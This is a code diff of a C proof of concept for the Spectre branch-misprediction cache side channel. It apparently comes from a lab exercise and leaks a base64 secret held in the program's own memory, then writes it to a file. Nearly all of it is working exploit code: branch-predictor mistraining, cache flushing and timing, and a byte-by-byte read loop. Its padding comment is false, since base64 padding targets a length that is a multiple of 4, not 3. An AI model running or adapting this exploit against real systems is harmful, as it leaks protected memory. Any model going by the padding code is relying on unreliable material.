@@ -1,22 +1,20 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
-#include <stdbool.h>
+#include <limits.h>
+#include <ctype.h>
 #include <string.h>
+#include <stdbool.h>
 #include <x86intrin.h> 
-
-void append(char* s, char c) {
-    int len = strlen(s);
-    s[len] = c;
-    s[len+1] = '\0';
-}
 
 #define L3_CACHE_ACCESS 80
 unsigned int arr1_size = 16;
 uint8_t arr1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
 uint8_t arr2[256 * 512];
 bool attack[100];                //Boolean array to hold each try results, If TRUE then attack ELSE misstrain again.
-int results[256];                //Holds the results for each character.
+
+// Unsigned long long is just too long to type for a single type name
+typedef unsigned long long ull;
 
 const char *readimage(char *filename)
 {
@@ -66,6 +64,12 @@ int fetch_victim(size_t index)
     return -1;
 }
 
+/* is_base64 - helper function that checks if a character is within the base64 character range.
+ */
+bool is_base64(char chr) {
+    return isalnum(chr) || chr == '+' || chr == '/';
+}
+
 // Phase 1 - Misstrain processor by feeding processes. (e.g. Manipulating the cache state to remove data that the processor will need to determine the actual control flow.)
 //         - Prepare for side-channel attack. In our case init arrays to hold the timing attack results(e.g. perform flush or evict part of a Flush+Reload or Evict-Reload attack.)
 
@@ -103,8 +107,6 @@ void train_branch_predictor(size_t target_idx, int tries)
     }
 }
 
-// Unsigned long long is just too long to type for a single type name
-typedef unsigned long long ull;
 
 /* time_l3_access - after the branch predictor training is complete, we time how long 
  * it takes to access certain elements of the array, and based on the timing, we then
@@ -123,13 +125,12 @@ ull time_l3_access(size_t idx) {
     return delta;
 }
 
-// Overall attack function.
+
 char read_byte(size_t target_idx)
 {
     int j, k;
-
-    // Initializing the results array
-    memset(results, 0, sizeof(results));
+    
+    int results[256] = {0};
 
     for (int tries = 250; tries > 0; --tries)
     {
@@ -151,7 +152,6 @@ char read_byte(size_t target_idx)
             }
         }
 
-        /* Locate highest & second-highest results results tallies in j/k */
         j = k = -1;
         for (size_t i = 0; i < 256; i++)
         {
@@ -165,55 +165,64 @@ char read_byte(size_t target_idx)
                 k = i;
             }
         }
+        // We need to have an early termination condition, both for exfiltration speed
         if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
         {
-            break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
+            break; 
         }
     }
-
     return (char) j;
 }
 
-int main()
+int main(int argc, char *argv[argc])
 {
-    const char *secret = readimage("input.txt");
+    const char *secret = readimage(argv[1]);
 
     // If we were doing a full scan of the address space, this could be any value 
     // past the beginning of the array, but this is sufficient for our purposes.
     size_t malicious_x = (size_t)(secret - (char *)arr1);
     size_t len = strlen(secret);
 
-    //set all values of array 2 as 1
+    // Since arr2 is a global, static variable, it is initialized to zero, and if it 
+    // is not accessed, then the pages are not even allocated. We don't want that
+    // to occur, so we need to manually set it up
     for (size_t i = 0; i < sizeof(arr2); i++)
     {
-        arr2[i] = 1; /* write to arr2 so in RAM not copy-on-write zero pages */
+        arr2[i] = 1; 
     }
-    /* Here the bool values , for whether to attack or mistrain is set. 1 in every 10 will attack. */
+    // Here we choose the rate of attacks, in this case 1/10
     for (int i = 0; i < 100; i += 10)
     {
         attack[i] = true;
     }
 
-    char str[len * sizeof(double)];
-    for (size_t i = 0; i <= len; i++)
-    {
-        char base64 = read_byte(malicious_x++);
-        if (base64 > 31 && base64 < 127)
-        {
-            append(str, base64);
-        } else {
-            append(str, 'A');
-        }
-    }
-
-    FILE *f = fopen("output.txt", "w");
-    if (!f)
+    FILE *fhandle = fopen(argv[2], "w");
+    if (!fhandle)
     {
         printf("Error opening file!\n");
         exit(1);
     }
-    fprintf(f, "%s\n", str);
-    fclose(f);
 
+    // This is where all of the work happens
+    for (size_t i = 0; i <= len; i++)
+    {
+        char byte = read_byte(malicious_x++);
+
+        if (is_base64(byte))
+        {
+            fputc(byte, fhandle);
+        } else {
+            fputc('A', fhandle);
+        }
+    }
+
+    // Ensure a well-formed base64 string, which only conforms
+    // to the spec if the total length is a multiple of 3
+    while (len % 3 > 0) {
+        fputc('=', fhandle);
+        len++;
+    }
+
+    fclose(fhandle);
     return 0;
 }
